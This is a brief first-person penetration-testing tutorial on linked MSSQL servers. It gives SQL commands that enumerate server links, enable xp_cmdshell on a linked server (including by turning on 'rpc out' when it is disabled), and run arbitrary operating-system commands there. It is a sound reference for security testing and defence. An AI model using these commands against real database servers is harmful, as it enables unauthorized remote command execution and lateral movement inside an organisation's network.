# <h1 align="center" id="heading">Linked MSSQL Servers</h1>
There are a few ways that I can go about enumerating Linked MSSQL Servers within a domain environment. If I have RDP access or shell access through Impacket's mssqlclient.py, I can manually enumerate server links. I can also use my previously developed tradecraft to accomplish the same task. The base command to enumerate a server link is as follows:
```sql
exec sp_linkedservers;
```
If there is a server link, I can use openquery to run queries on the remote SQL server. I can select the MSSQL version with the following command:
```sql
select version from openquery("<target>", 'select @@version as version');
```
If I have access, I can enable xp_cmdshell through the server link with the following command:
```sql
exec ('sp_configure ''show advanced options'', 1; reconfigure;exec sp_configure ''xp_cmdshell'', 1; reconfigure;') at <target>;exec ('xp_cmdshell ''whoami'';') at <target>;
```
There may be a case where RPC is disabled on the remote server. In that case I can still enable xp_cmdshell with the following command:
```sql
exec sp_serveroption '<target>', 'rpc out', 'true';exec ('sp_configure ''show advanced options'', 1; reconfigure;exec sp_configure ''xp_cmdshell'', 1; reconfigure;') at <target>;exec ('xp_cmdshell ''whoami'';') at <target>;
```
If I get a username returned by either of the previous commands, I can use the following query string to execute commands on the remote server:
```sql
exec ('xp_cmdshell ''<command>'';') at <target>;
```
